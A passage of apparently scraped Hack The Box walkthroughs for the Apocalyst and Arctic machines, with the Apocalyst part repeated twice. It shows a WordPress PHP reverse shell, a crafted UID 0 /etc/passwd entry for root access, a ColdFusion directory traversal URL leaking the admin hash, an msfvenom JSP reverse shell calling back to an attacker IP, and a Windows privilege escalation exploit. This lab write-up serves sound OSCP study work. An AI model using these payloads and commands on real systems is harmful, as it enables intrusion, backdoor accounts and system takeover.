ubuntu=16.04|14.04 Download URL: [https://www.exploit-db.com/download/40871](https://www.exploit-db.com/download/40871) [+] [CVE-2016\u20139793] SO_{SND|RCV}BUFFORCEDetails: [https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793](https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793) Download URL: [https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c](https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c) Comments: CAP_NET_ADMIN caps OR CONFIG_USER_NS=y needed. No SMEP/SMAP/KASLR bypass included [+] [CVE-2017\u20136074] dccp Details: [http://www.openwall.com/lists/oss-security/2017/02/22/3](http://www.openwall.com/lists/oss-security/2017/02/22/3) Tags: ubuntu=16.04 Download URL: [https://www.exploit-db.com/download/41458](https://www.exploit-db.com/download/41458) Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass [+] [CVE-2017\u20137308] af_packet Details: [https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html](https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html) Tags: ubuntu=16.04(kernel:4.8.0\u201341) Download URL: [https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c](https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c) Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS=y needs to be enabled [+] [CVE-2017\u20131000112] NETIF_F_UFO Details: [http://www.openwall.com/lists/oss-security/2017/08/13/1](http://www.openwall.com/lists/oss-security/2017/08/13/1) Tags: ubuntu=14.04(kernel:4.4.0-*)|16.04(kernel:4.8.0-*) Download URL: [https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c](https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c) Comments: CAP_NET_ADMIN cap or CONFIG_USER_NS=y needed. SMEP/KASLR bypass included [+] [CVE-2017\u20131000253] PIE_stack_corruption Details: [https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt](https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt) Tags: RHEL=7(kernel:3.10) Download URL: [https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c](https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c) [+] [CVE-2009\u20131185] udev Details: [https://www.exploit-db.com/exploits/8572/](https://www.exploit-db.com/exploits/8572/) Tags: ubuntu=8.10|9.04 Download URL: [https://www.exploit-db.com/download/8572](https://www.exploit-db.com/download/8572) Comments: Version 1.4.1 vulnerable but distros use own versioning scheme. Manual verification needed [+] [CVE-2009\u20131185] udev 2 Details: [https://www.exploit-db.com/exploits/8478/](https://www.exploit-db.com/exploits/8478/) Download URL: [https://www.exploit-db.com/download/8478](https://www.exploit-db.com/download/8478) Comments: SSH access to non privileged user is needed. Version 1.4.1 vulnerable but distros use own versioning scheme. Manual verification needed [+] [CVE-2017\u20131000367] Sudoer-to-root Details: [https://www.sudo.ws/alerts/linux_tty.html](https://www.sudo.ws/alerts/linux_tty.html) Tags: RHEL=7(sudo:1.8.6p7) Download URL: [https://www.qualys.com/2017/05/30/cve-2017-1000367/linux_sudo_cve-2017-1000367.c](https://www.qualys.com/2017/05/30/cve-2017-1000367/linux_sudo_cve-2017-1000367.c) Comments: Needs to be sudoer. Works only on SELinux enabled systems [+] [CVE-2017\u20131000367] sudopwn Details: [https://www.sudo.ws/alerts/linux_tty.html](https://www.sudo.ws/alerts/linux_tty.html) Download URL: [https://raw.githubusercontent.com/c0d3z3r0/sudo-CVE-2017-1000367/master/sudopwn.c](https://raw.githubusercontent.com/c0d3z3r0/sudo-CVE-2017-1000367/master/sudopwn.c) Comments: Needs to be sudoer. Works only on SELinux enabled systems Again we have a bunch of possible exploits but I\u2019m not done enumerating, I\u2019m going to upload LinEnum.sh to enumerate the entire system. I started a python HTTP server listening on port 8080 on my local machine root@kali:~/Downloads/LinEnum# ls CHANGELOG.md CONTRIBUTORS.md LinEnum.sh README.md root@kali:~/Downloads/LinEnum# python -m SimpleHTTPServer 8080 Serving HTTP on 0.0.0.0 port 8080 \u2026 and downloaded the LinEnum.sh file into the temp folder of the victim. www-data@apocalyst:/tmp$ wget [http://10.10.14.122:8080/LinEnum.sh](http://10.10.14.122:8080/LinEnum.sh) wget [http://10.10.14.122:8080/LinEnum.sh](http://10.10.14.122:8080/LinEnum.sh) \u2014 2017\u201311\u201323 23:53:22 \u2014 [http://10.10.14.122:8080/LinEnum.sh](http://10.10.14.122:8080/LinEnum.sh) Connecting to 10.10.14.122:8080\u2026 connected. HTTP request sent, awaiting response\u2026 200 OK Length: 43283 (42K) [text/x-sh] Saving to: \u2018LinEnum.sh\u2019 LinEnum.sh 100%[=================== ] 42.27K 169KB/s in 0.2s 2017\u201311\u201323 23:53:23 (169 KB/s) \u2014 \u2018LinEnum.sh\u2019 saved [43283/43283] www-data@apocalyst:/tmp$ ls -la ls -la total 152 drwxrwxrwt 10 root root 4096 Nov 23 23:53 . drwxr-xr-x 23 root root 4096 Jul 26 12:37 .. drwxrwxrwt 2 root root 4096 Nov 23 16:26 .ICE-unix drwxrwxrwt 2 root root 4096 Nov 23 16:26 .Test-unix drwxrwxrwt 2 root root 4096 Nov 23 16:26 .X11-unix drwxrwxrwt 2 root root 4096 Nov 23 16:26 .XIM-unix drwxrwxrwt 2 root root 4096 Nov 23 16:26 .font-unix -rwxr-xr-x 1 www-data www-data 1879 Nov 23 19:49 ItyhsHrJBV -rw-rw-rw- 1 www-data www-data 43283 Nov 23 23:52 LinEnum.sh -rwxr-xr-x 1 www-data www-data 1879 Nov 23 19:48 TxFbxalONx -rwxr-xr-x 1 www-data www-data 207 Nov 23 19:49 czDNtfLuLg -rwxr-xr-x 1 www-data www-data 1879 Nov 23 19:48 gAaiSQXKTW -rwxr-xr-x 1 www-data www-data 43052 Nov 23 19:08 linux-exploit-suggester.sh -rwxr-xr-x 1 www-data www-data 207 Nov 23 19:48 ljSBJYhPoF drwx \u2014 \u2014 \u2014 3 root root 4096 Nov 23 16:26 systemd-private-545318da7c6e44889bdb503e2414bea4-systemd-timesyncd.service-846O18 drwxrwxr-x 2 falaraki falaraki 4096 Nov 23 23:52 tmp drwx \u2014 \u2014 \u2014 2 root root 4096 Nov 23 16:26 vmware-root -rwxr-xr-x 1 www-data www-data 207 Nov 23 19:48 wsbBhpkLkI I gave it execute permissions and I ran the script. We get a bunch of output that I\u2019m not going to paste here because it will make my writeup extremely long, but I found something interesting we can write to /etc/passwd Can we read/write sensitive files: -rw-rw-r \u2014 1 root root 1637 Nov 23 23:46 /etc/passwd -rw-r \u2014 r \u2014 1 root root 830 Jul 27 12:06 /etc/group -rw-r \u2014 r \u2014 1 root root 575 Oct 22 2015 /etc/profile -rw-r \u2014 \u2014 \u2014 1 root shadow 1070 Jul 26 13:41 /etc/shadow -rw- is the permission of the owner of the file which is root -rw- is the permission that the group has over the file -r \u2014 is the permissions that all the other users have over the file I used openssl to generate a password the password was HackedByKatz The purpose of the openssl passwd command is to feed your password through a one-way hashing algorithm ( -1 outputs MD5). What that gets you is a string that's derived from your password cryptographically, but cannot be used to find your password on its own if an attacker gets their hands on the hashed version. The /etc/passwd contains one entry per line for each user (or user account) of the system. All fields are separated by a colon (:) symbol. Total seven fields as follows. Generally, passwd file entry looks as follows\u2026 Source: https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/ Username : It is used when user logs in. It should be between 1 and 32 characters in length. Password : An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to computes the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file. User ID (UID) : Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1\u201399 are reserved for other predefined accounts. Further UID 100\u2013999 are reserved by system for administrative and system accounts/groups. Group ID (GID) : The primary group ID (stored in /etc/group file) User ID Info : The comment field. It allow you to add extra information about the users such as user\u2019s full name, phone number etc. This field use by finger command. Home directory : The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes / Command/shell : The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell. Now let\u2019s construct a user line based on what we just learned about /etc/passwd Katz:$1$pm/vHfDN$Oa.8XX4nKsoqpU2oeT3P6/:0:0:Katz:/root:/bin/bash All we need to do now is add it to the /etc/passwd file but we have a problem; we can\u2019t write to /etc/password with nano or vi\u2026. So we need to figure out another way to write to the file. Perhaps echo should work, we know that we can use to redirect to a file, we know that if for example we write echo \u201cHello World\u201d file1.txt we would be creating a file with the content inside the double quotes and if we add another word with the same redirection it would append to the end of the file. We can see this action below Now if we do that would erase all of the content and it would only have what\u2019s inside the double quotes. So we don\u2019t want to be using when redirecting output to /etc/passwd But we\u2019re going to face another problem, take a look at the following screen shot I have created a variable which contains the string TEST all good right? Now if I want to display the string I assigned to the variable I have to use the \\$ sign. That\u2019s how you call variables in bash. So there\u2019s going to be conflict when if we echo passwd /etc/passwd there won\u2019t be errors but bash will think that $1 and $ pm/vHfDN$Oa.8XX4nKsoqpU2oeT3P6/ are variables and your /etc/passwd file will look something like this\u2026 Katz::0:0:Katz:/root:/bin/bash That will not allow you to login as the user Katz properly. Something that we could do to bypass this issue is to encode it in base64 Copy the base64 string to decode it but on it\u2019s way to being decoded also redirect it to the /etc/passwd file like so That\u2019s it! our user should now be in the /etc/passwd and we should be able to login with su Katz Got Root Flag!","title":"7. Apocalyst Writeup.md"},{"location":"Retired/Apocalyst Writeup/#and-were-in","text":"Now we can upload our php reverse shell in the Appearance Editor. I got my php shell from PenTestMonkey I\u2019m not going to paste the entire code here because it\u2019s a lot of code, so all you have to do is change your ip and port number. Where it says //CHANGE THIS to your ip and desired port number. $ip = \u2018127.0.0.1\u2019; // CHANGE THIS $port = 1234; // CHANGE THIS Save the changes made to the file once your reverse shell is in and setup your netcat or metasploit listener. Then execute the php reverse shell. http://apocalyst.htb/wp-content/themes/twentyseventeen/404.php Now we can get the user flag! \u201cOne of my go-to commands after catching a dumb shell is to use Python to spawn a pty. The pty module let\u2019s you spawn a psuedo-terminal that can fool commands like su into thinking they are being executed in a proper terminal. To upgrade a dumb shell, simply run the following command\u201d `python3 -c import pty; pty.spawn( /bin/bash ) ` I uploaded linux-exploit-suggester to the system to check for possible privilege escalation exploits. www-data@apocalyst:/tmp$ ./linux-exploit-suggester.sh ./linux-exploit-suggester.sh Kernel version: 4.4.0 Architecture: x86_64 Distribution: ubuntu Package list: from current OS Possible Exploits: [+] [CVE-2015\u20133290] espfix64_NMI Details: [http://www.openwall.com/lists/oss-security/2015/08/04/8](http://www.openwall.com/lists/oss-security/2015/08/04/8) Download URL: [https://www.exploit-db.com/download/37722](https://www.exploit-db.com/download/37722) [+] [CVE-2016\u20130728] keyring Details: [http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/](http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/) Download URL: [https://www.exploit-db.com/download/40003](https://www.exploit-db.com/download/40003) Comments: Exploit takes about ~30 minutes to run [+] [CVE-2016\u20132384] usb-midi Details: [https://xairy.github.io/blog/2016/cve-2016-2384](https://xairy.github.io/blog/2016/cve-2016-2384) Tags: ubuntu=14.04,fedora=22 Download URL: [https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c](https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c) Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user [+] [N/A] target_offset Details: [https://www.exploit-db.com/exploits/40049/](https://www.exploit-db.com/exploits/40049/) Tags: ubuntu=16.04(kernel:4.4.0\u201321) Download URL: [https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/40053.zip](https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/40053.zip) Comments: ip_tables.ko needs to be loaded [+] [CVE-2016\u20134557] double-fdput() Details: [https://bugs.chromium.org/p/project-zero/issues/detail?id=808](https://bugs.chromium.org/p/project-zero/issues/detail?id=808) Tags: ubuntu=16.04(kernel:4.4.0\u201362) Download URL: [https://bugs.chromium.org/p/project-zero/issues/attachment?aid=232552](https://bugs.chromium.org/p/project-zero/issues/attachment?aid=232552) Comments: CONFIG_BPF_SYSCALL needs to be set kernel.unprivileged_bpf_disabled != 1 [+] [CVE-2016\u20135195] dirtycow Details: [https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails](https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails) Tags: RHEL=5|6|7,debian=7|8,ubuntu=16.10|16.04|14.04|12.04 Download URL: [https://www.exploit-db.com/download/40611](https://www.exploit-db.com/download/40611) [+] [CVE-2016\u20135195] dirtycow 2 Details: [https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails](https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails) Tags: RHEL=5|6|7,debian=7|8,ubuntu=16.10|16.04|14.04|12.04 Download URL: [https://www.exploit-db.com/download/40616](https://www.exploit-db.com/download/40616) [+] [CVE-2016\u20138655] chocobo_root Details: [http://www.openwall.com/lists/oss-security/2016/12/06/1](http://www.openwall.com/lists/oss-security/2016/12/06/1) Tags: ubuntu=16.04|14.04 Download URL: [https://www.exploit-db.com/download/40871](https://www.exploit-db.com/download/40871) [+] [CVE-2016\u20139793] SO_{SND|RCV}BUFFORCEDetails: [https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793](https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793) Download URL: [https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c](https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c) Comments: CAP_NET_ADMIN caps OR CONFIG_USER_NS=y needed. No SMEP/SMAP/KASLR bypass included [+] [CVE-2017\u20136074] dccp Details: [http://www.openwall.com/lists/oss-security/2017/02/22/3](http://www.openwall.com/lists/oss-security/2017/02/22/3) Tags: ubuntu=16.04 Download URL: [https://www.exploit-db.com/download/41458](https://www.exploit-db.com/download/41458) Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass [+] [CVE-2017\u20137308] af_packet Details: [https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html](https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html) Tags: ubuntu=16.04(kernel:4.8.0\u201341) Download URL: [https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c](https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c) Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS=y needs to be enabled [+] [CVE-2017\u20131000112] NETIF_F_UFO Details: [http://www.openwall.com/lists/oss-security/2017/08/13/1](http://www.openwall.com/lists/oss-security/2017/08/13/1) Tags: ubuntu=14.04(kernel:4.4.0-*)|16.04(kernel:4.8.0-*) Download URL: [https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c](https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c) Comments: CAP_NET_ADMIN cap or CONFIG_USER_NS=y needed. SMEP/KASLR bypass included [+] [CVE-2017\u20131000253] PIE_stack_corruption Details: [https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt](https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt) Tags: RHEL=7(kernel:3.10) Download URL: [https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c](https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c) [+] [CVE-2009\u20131185] udev Details: [https://www.exploit-db.com/exploits/8572/](https://www.exploit-db.com/exploits/8572/) Tags: ubuntu=8.10|9.04 Download URL: [https://www.exploit-db.com/download/8572](https://www.exploit-db.com/download/8572) Comments: Version 1.4.1 vulnerable but distros use own versioning scheme. Manual verification needed [+] [CVE-2009\u20131185] udev 2 Details: [https://www.exploit-db.com/exploits/8478/](https://www.exploit-db.com/exploits/8478/) Download URL: [https://www.exploit-db.com/download/8478](https://www.exploit-db.com/download/8478) Comments: SSH access to non privileged user is needed. Version 1.4.1 vulnerable but distros use own versioning scheme. Manual verification needed [+] [CVE-2017\u20131000367] Sudoer-to-root Details: [https://www.sudo.ws/alerts/linux_tty.html](https://www.sudo.ws/alerts/linux_tty.html) Tags: RHEL=7(sudo:1.8.6p7) Download URL: [https://www.qualys.com/2017/05/30/cve-2017-1000367/linux_sudo_cve-2017-1000367.c](https://www.qualys.com/2017/05/30/cve-2017-1000367/linux_sudo_cve-2017-1000367.c) Comments: Needs to be sudoer. Works only on SELinux enabled systems [+] [CVE-2017\u20131000367] sudopwn Details: [https://www.sudo.ws/alerts/linux_tty.html](https://www.sudo.ws/alerts/linux_tty.html) Download URL: [https://raw.githubusercontent.com/c0d3z3r0/sudo-CVE-2017-1000367/master/sudopwn.c](https://raw.githubusercontent.com/c0d3z3r0/sudo-CVE-2017-1000367/master/sudopwn.c) Comments: Needs to be sudoer. Works only on SELinux enabled systems Again we have a bunch of possible exploits but I\u2019m not done enumerating, I\u2019m going to upload LinEnum.sh to enumerate the entire system. I started a python HTTP server listening on port 8080 on my local machine root@kali:~/Downloads/LinEnum# ls CHANGELOG.md CONTRIBUTORS.md LinEnum.sh README.md root@kali:~/Downloads/LinEnum# python -m SimpleHTTPServer 8080 Serving HTTP on 0.0.0.0 port 8080 \u2026 and downloaded the LinEnum.sh file into the temp folder of the victim. www-data@apocalyst:/tmp$ wget [http://10.10.14.122:8080/LinEnum.sh](http://10.10.14.122:8080/LinEnum.sh) wget [http://10.10.14.122:8080/LinEnum.sh](http://10.10.14.122:8080/LinEnum.sh) \u2014 2017\u201311\u201323 23:53:22 \u2014 [http://10.10.14.122:8080/LinEnum.sh](http://10.10.14.122:8080/LinEnum.sh) Connecting to 10.10.14.122:8080\u2026 connected. HTTP request sent, awaiting response\u2026 200 OK Length: 43283 (42K) [text/x-sh] Saving to: \u2018LinEnum.sh\u2019 LinEnum.sh 100%[=================== ] 42.27K 169KB/s in 0.2s 2017\u201311\u201323 23:53:23 (169 KB/s) \u2014 \u2018LinEnum.sh\u2019 saved [43283/43283] www-data@apocalyst:/tmp$ ls -la ls -la total 152 drwxrwxrwt 10 root root 4096 Nov 23 23:53 . drwxr-xr-x 23 root root 4096 Jul 26 12:37 .. drwxrwxrwt 2 root root 4096 Nov 23 16:26 .ICE-unix drwxrwxrwt 2 root root 4096 Nov 23 16:26 .Test-unix drwxrwxrwt 2 root root 4096 Nov 23 16:26 .X11-unix drwxrwxrwt 2 root root 4096 Nov 23 16:26 .XIM-unix drwxrwxrwt 2 root root 4096 Nov 23 16:26 .font-unix -rwxr-xr-x 1 www-data www-data 1879 Nov 23 19:49 ItyhsHrJBV -rw-rw-rw- 1 www-data www-data 43283 Nov 23 23:52 LinEnum.sh -rwxr-xr-x 1 www-data www-data 1879 Nov 23 19:48 TxFbxalONx -rwxr-xr-x 1 www-data www-data 207 Nov 23 19:49 czDNtfLuLg -rwxr-xr-x 1 www-data www-data 1879 Nov 23 19:48 gAaiSQXKTW -rwxr-xr-x 1 www-data www-data 43052 Nov 23 19:08 linux-exploit-suggester.sh -rwxr-xr-x 1 www-data www-data 207 Nov 23 19:48 ljSBJYhPoF drwx \u2014 \u2014 \u2014 3 root root 4096 Nov 23 16:26 systemd-private-545318da7c6e44889bdb503e2414bea4-systemd-timesyncd.service-846O18 drwxrwxr-x 2 falaraki falaraki 4096 Nov 23 23:52 tmp drwx \u2014 \u2014 \u2014 2 root root 4096 Nov 23 16:26 vmware-root -rwxr-xr-x 1 www-data www-data 207 Nov 23 19:48 wsbBhpkLkI I gave it execute permissions and I ran the script. We get a bunch of output that I\u2019m not going to paste here because it will make my writeup extremely long, but I found something interesting we can write to /etc/passwd Can we read/write sensitive files: -rw-rw-r \u2014 1 root root 1637 Nov 23 23:46 /etc/passwd -rw-r \u2014 r \u2014 1 root root 830 Jul 27 12:06 /etc/group -rw-r \u2014 r \u2014 1 root root 575 Oct 22 2015 /etc/profile -rw-r \u2014 \u2014 \u2014 1 root shadow 1070 Jul 26 13:41 /etc/shadow -rw- is the permission of the owner of the file which is root -rw- is the permission that the group has over the file -r \u2014 is the permissions that all the other users have over the file I used openssl to generate a password the password was HackedByKatz The purpose of the openssl passwd command is to feed your password through a one-way hashing algorithm ( -1 outputs MD5). What that gets you is a string that's derived from your password cryptographically, but cannot be used to find your password on its own if an attacker gets their hands on the hashed version. The /etc/passwd contains one entry per line for each user (or user account) of the system. All fields are separated by a colon (:) symbol. Total seven fields as follows. Generally, passwd file entry looks as follows\u2026 Source: https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/ Username : It is used when user logs in. It should be between 1 and 32 characters in length. Password : An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to computes the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file. User ID (UID) : Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1\u201399 are reserved for other predefined accounts. Further UID 100\u2013999 are reserved by system for administrative and system accounts/groups. Group ID (GID) : The primary group ID (stored in /etc/group file) User ID Info : The comment field. It allow you to add extra information about the users such as user\u2019s full name, phone number etc. This field use by finger command. Home directory : The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes / Command/shell : The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell. Now let\u2019s construct a user line based on what we just learned about /etc/passwd Katz:$1$pm/vHfDN$Oa.8XX4nKsoqpU2oeT3P6/:0:0:Katz:/root:/bin/bash All we need to do now is add it to the /etc/passwd file but we have a problem; we can\u2019t write to /etc/password with nano or vi\u2026. So we need to figure out another way to write to the file. Perhaps echo should work, we know that we can use to redirect to a file, we know that if for example we write echo \u201cHello World\u201d file1.txt we would be creating a file with the content inside the double quotes and if we add another word with the same redirection it would append to the end of the file. We can see this action below Now if we do that would erase all of the content and it would only have what\u2019s inside the double quotes. So we don\u2019t want to be using when redirecting output to /etc/passwd But we\u2019re going to face another problem, take a look at the following screen shot I have created a variable which contains the string TEST all good right? Now if I want to display the string I assigned to the variable I have to use the \\$ sign. That\u2019s how you call variables in bash. So there\u2019s going to be conflict when if we echo passwd /etc/passwd there won\u2019t be errors but bash will think that $1 and $ pm/vHfDN$Oa.8XX4nKsoqpU2oeT3P6/ are variables and your /etc/passwd file will look something like this\u2026 Katz::0:0:Katz:/root:/bin/bash That will not allow you to login as the user Katz properly. Something that we could do to bypass this issue is to encode it in base64 Copy the base64 string to decode it but on it\u2019s way to being decoded also redirect it to the /etc/passwd file like so That\u2019s it! our user should now be in the /etc/passwd and we should be able to login with su Katz Got Root Flag!","title":"\u2026and were in!"},{"location":"Retired/Arctic Writeup wo Metasploit/","text":"This is the sixth blog out of a series of blogs I will be publishing on retired HTB machines in preparation for the OSCP. The full list of OSCP like machines compiled by TJnull can be found here . Let\u2019s get started! Reconnaissance First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on these ports. nmap -sC -sV -O -oA htb/arctic/nmap/initial 10.10.10.11 -sC : run default nmap scripts -sV : detect service version -O : detect OS -oA : output all formats and store in file nmap/initial We get back the following result showing that three port is open: Ports 135 49154: running Microsoft Windows RPC. Port 8500 : possibly running Flight Message Transfer Protocol (FMTP). Before we start investigating these ports, let\u2019s run more comprehensive nmap scans in the background to make sure we cover all bases. Let\u2019s run an nmap scan that covers all ports. nmap -sC -sV -O -p- -oA htb/arctic/nmap/full 10.10.10.11 We get back the following result. No other ports are open. Similarly, we run an nmap scan with the -sU flag enabled to run a UDP scan. nmap -sU -O -p- -oA htb/arctic/nmap/udp 10.10.10.11 We get back the following result. Enumeration Let\u2019s do some more enumeration on port 8500. Visit the URL in the browser. It takes about 30 seconds to perform every request! So we\u2019ll try and see if we could perform our enumeration manually before we resort to automated tools. When you visit the cfdocs/ directory, you\u2019ll find an administrator/ directory. When you click on the administrator/ directory, you\u2019re presented with an admin login page. Default/common credentials didn\u2019t work and a password cracker would take an unbelievably long time (30s per request), so we\u2019ll have to see if the application itself is vulnerable to any exploits. The login page does tell us that it\u2019s using Adobe ColdFusion 8, which is a web development application platform. We\u2019ll use the platform name to see if it contains any vulnerabilities. searchsploit -update # update database searchsploit --id adobe coldfusion id : Display the EDB-ID value rather than local path The application is using version 8, so we only care about exploits relevant to this specific version. After reviewing the exploits, two of them stand out: 14641 \u2014 Directory Traversal. We\u2019ll use that to get the password of the administrator. 45979 \u2014 Arbitrary file Upload. We\u2019ll use that to get a reverse shell on the target machine. Gaining an Initial Foothold Let\u2019s look at the code for exploit 14641. We don\u2019t actually have to run the exploit file. Instead, we could just navigate to the above URL to display the content of the password.properties file. [http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en](http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en) The password is outputted to the screen! The password seems to be hashed, so we can\u2019t simply use it in the password field. We can try to crack it, but first let\u2019s see if there are any other vulnerabilities present in the way the application handles passwords on the client side. Right click on the page and select View Page Source . There, we find three pieces of important information on the steps taken to send the password to the backend. The password is taken from the password field and hashed using SHA1. This is done on the client side. Then the hashed password is HMAC-ed using a salt value taken from the parameter salt field. This is also done on the client side. The HMAC-ed password gets sent to the server with the salt value. There, I\u2019m assuming the server verifies that the hashed password was HMAC-ed with the correct salt value. form name= loginform action= /CFIDE/administrator/enter.cfm method= POST onSubmit= cfadminPassword.value = hex_hmac_sha1(salt.value, hex_sha1(cfadminPassword.value)); The directory traversal vulnerability did not give us the plaintext password but instead gave us an already hashed password. 2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03 Therefore, instead of cracking the password (which can take a long time!) we can calculate the cfadminPassword.value and use an intercepting proxy to bypass the client side calculation. To quickly calculate the cfadminPassword value use the Console in your browser Developer Tools to run the following JS code. console.log(hex_hmac_sha1(document.loginform.salt.value, 2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03 )); What that does is cryptographically hash the hashed password we found with the salt value. This is equivalent to what the form does when you hit the login button. Therefore, to conduct the attack use the above JS code to calculate the HMAC of the password. Then set the Intercept to On in Burp and on the login page submit any random value in the password field and hit login. Intercept the request with Burp and change the cfadminPassword field to the value we got in the console and forward the request. This allows us to login as administrator without knowing the administrator password! This attack can be referred to as passing the hash. What we essentially did over here is bypass any client side scripts that hash and then HMAC the password and instead, did it by ourselves and sent the request directly to the server. If you had the original plaintext (not hashed) password, you wouldn\u2019t have to go through all this trouble. To make matters even worse, you need to perform the above steps in the short window of 30 seconds! The application seems to reload every 30 seconds and with every reload a new salt value is used. Now, you might ask \u201cwhy not just get the original salt value and when I intercept the request in Burp, change the salt value to the one I used in the JS code? This way I wouldn\u2019t have to abide by the 30 second rule\u201d. Great question! I had this idea as well, only to find out that the salt value is coming from the server side and seems to also be updated and saved on the server side. So, if you use a previous salt or your own made up salt, the application will reject it! Uploading a Reverse Shell Now that we successfully exploited the directory traversal vulnerability to gain access to the admin console, let\u2019s try to exploit the arbitrary file upload vulnerability to upload a reverse shell on the server. The exploit 45979 does not pan out. The directories listed in the exploit do not match the specific version of ColdFusion that is being used here. Arrexel did write an exploit that would work and was written specifically for this box. So it is technically cheating, but I have already spent enough time on this box, so I\u2019m going to use it! Note : The arbitrary file exploit does not require you to authenticate, so technically you don\u2019t need to exploit the directory traversal vulnerability beforehand, unless you plan on using the GUI. It is worth noting that in the Administrator GUI, there is a Debugging Logging Scheduled Tasks category that would allow us to upload files. Instead, I\u2019m going to use arrexal\u2019s exploit. First, generate a JSP reverse shell that will be run and served by the server. msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.6 LPORT=4444 shell.jsp Next, run arrexal\u2019s exploit. python arb-file-exploit.py 10.10.10.11 8500 shell.jsp The exploit tells us where the exploit file was saved. Next, start up a listener on the attack machine. nc -nlvp 4444 Then visit the location of the exploit in the browser to run the shell.jsp file. [http://10.10.10.11:8500/userfiles/file/exploit.jsp](http://10.10.10.11:8500/userfiles/file/exploit.jsp) We have a shell! Grab the user flag. This is a non-privileged shell, so we\u2019ll have to find a way to escalate privileges. Privilege Escalation Let\u2019s find out more about the system. It\u2019s running Microsoft Windows 2008 and has not had any updates! Copy the output of the systeminfo command and save it in a file. We\u2019ll use Windows Exploit Suggester to identify any missing patches that could potentially allow us to escalate privileges. First update the database. ./windows-exploit-suggester.py --update Then run the exploit suggester. ./windows-exploit-suggester.py --database 2019-10-12-mssb.xls --systeminfo /root/Desktop/htb/arctic/systeminfo.txt We have 3 non-Metasploit exploits. I tried MS11\u2013011 but I didn\u2019t get a privileged shell. MS10\u2013059 did work! I found an already compiled executable for it here . Disclaimer : You really should not use files that you don\u2019t compile yourself, especially if they open up a reverse shell to your machine. Although I\u2019m using this precompiled exploit, I don\u2019t vouch for it. I\u2019ll transfer the file using arrexal\u2019s exploit by simply changing the req parameter from ...CurrentFolder=/exploit.jsp to ...CurrentFolder=/exploit.exe Run the exploit in the same way and it uploads the exploit to the following directory on the target machine. cd C:\\ColdFusion8\\wwwroot\\userfiles\\file Start up another listener on the attack machine. nc -nlvp 6666 Run the exploit. exploit.exe 10.10.14.6 6666 We have system! Grab the root flag. Lessons Learned What allowed me to gain initial access to the machine and escalate privileges, is 